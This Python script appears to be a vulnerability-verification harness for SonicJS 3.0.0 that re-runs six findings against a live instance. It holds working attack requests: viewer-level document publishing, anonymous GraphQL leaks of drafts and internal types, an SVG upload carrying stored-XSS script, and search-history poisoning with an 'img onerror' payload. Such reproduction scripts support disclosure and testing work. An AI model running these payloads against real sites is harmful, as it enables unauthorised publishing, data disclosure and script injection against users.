#!/usr/bin/env python3
"""SonicJS 3.0.0 live harness — re-runs S-001..S-006 against a running instance.
Usage: python3 harness.py http://localhost:8787
Requires: a seeded editor (e@e.com/123123123 via POST /auth/seed-admin in dev) OR
edit ADMIN creds below. Creates its own viewer + content each run."""
import sys, json, urllib.request, urllib.error, uuid

B = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8787").rstrip("/")
def req(method, path, body=None, token=None, raw=None, ctype="application/json"):
    r = urllib.request.Request(B + path, method=method)
    if token: r.add_header("Authorization", "Bearer " + token)
    data = raw
    if body is not None: data = json.dumps(body).encode()
    if data is not None: r.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(r, data=data) as resp:
            return resp.status, resp.read().decode(errors="replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace"), dict(e.headers or {})

def gql(query, token=None):
    s, t, _ = req("POST", "/graphql", {"query": query}, token)
    return s, json.loads(t) if t else {}

sfx = uuid.uuid4().hex[:6]
# accounts: register viewer (public registration, default on)
_, t, _ = req("POST", "/auth/register", {"email": f"viewer-{sfx}@evil.test", "password": "Attacker123!", "firstName": "V", "lastName": "W"})
viewer = json.loads(t)["token"]
_, t, _ = req("POST", "/auth/login", {"email": "e@e.com", "password": "123123123"})
editor = json.loads(t).get("token", "")
print(f"[*] viewer token ok, editor token ok={bool(editor)}")

# S-002 viewer create+publish (run first so the doc exists for S-001 checks)
s, d = gql(f'mutation {{ createDocument(typeId:"blog_post", title:"HARNESS PWN {sfx}", slug:"harness-pwn-{sfx}", data:{{title:"HARNESS PWN {sfx}", content:"harness-body-{sfx}"}}, publishOnCreate:true) {{ id title }} }}', viewer)
doc_id = d.get("data", {}).get("createDocument", {}).get("id")
print(f"[S-002] viewer createDocument publishOnCreate -> status={s} id={doc_id}  VULN={bool(doc_id)}")

# S-001 unauth draft/internal disclosure: editor creates a draft, anon reads it via GraphQL
s, d = gql(f'mutation {{ createDocument(typeId:"blog_post", title:"HARNESS DRAFT {sfx}", slug:"harness-draft-{sfx}", data:{{title:"HARNESS DRAFT {sfx}", content:"draft-secret-{sfx}"}}, publishOnCreate:false) {{ id }} }}', editor or viewer)
draft_id = d.get("data", {}).get("createDocument", {}).get("id")
s, d = gql('{ documents(status:"draft", limit:50) { items { id title data } } }')
leak = f"draft-secret-{sfx}" in json.dumps(d)
s2, d2 = gql('{ documents(status:"all", limit:100) { items { typeId } } }')
internal = sorted({i["typeId"] for i in d2.get("data", {}).get("documents", {}).get("items", [])} & {"rbac_user_roles", "rbac_role", "plugin", "security_event"})
print(f"[S-001] unauth GraphQL draft leak={leak} internal types leaked={internal}  VULN={leak}")

# S-003 REST anon ACL: published faq (no access block) via editor, compare surfaces
gql(f'mutation {{ createDocument(typeId:"faq", title:"HARNESS FAQ {sfx}", slug:"harness-faq-{sfx}", data:{{question:"HARNESS FAQ {sfx}", answer:"faq-secret-{sfx}"}}, publishOnCreate:true) {{ id }} }}', editor or viewer)
_, t_docs, _ = req("GET", "/api/documents?type=faq")
_, t_content, _ = req("GET", "/api/content?collection=faq")
print(f"[S-003] /api/documents leaks faq-secret={f'faq-secret-{sfx}' in t_docs} (expect False) | /api/content leaks={f'faq-secret-{sfx}' in t_content}  VULN={f'faq-secret-{sfx}' in t_content and f'faq-secret-{sfx}' not in t_docs}")

# S-004 SVG stored XSS as viewer
import urllib.request as u
boundary = "----harness" + sfx
svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><script>alert(1)</script></svg>'
raw = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"pwn.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n{svg}\r\n--{boundary}--\r\n").encode()
s, t, _ = req("POST", "/api/media/upload", token=viewer, raw=raw, ctype=f"multipart/form-data; boundary={boundary}")
key = json.loads(t).get("file", {}).get("r2_key", "") if t else ""
s, t, h = req("GET", "/files/" + key)
ok = s == 200 and "<script>alert(1)</script>" in t and any(k.lower()=="content-type" and v.startswith("image/svg+xml") for k,v in h.items()) and not any(k.lower()=="content-security-policy" for k in h)
print(f"[S-004] svg served inline w/ script, CSP absent -> {ok}  VULN={ok}")

# S-006 search-history poisoning (unauth)
payload = "sonic<img src=x onerror=alert(document.domain)>"
req("POST", "/api/search", {"query": payload}); req("POST", "/api/search", {"query": payload})
_, t, _ = req("GET", "/api/search/suggest?q=so")
print(f"[S-006] suggest returns payload verbatim={payload in t}  VULN={payload in t} (sink: innerHTML in admin-content-list.template.ts)")
print("[S-005] media-selector alt XSS: see EVIDENCE.md (requires admin session cookie; selector HTML contains injected <svg onload>)")
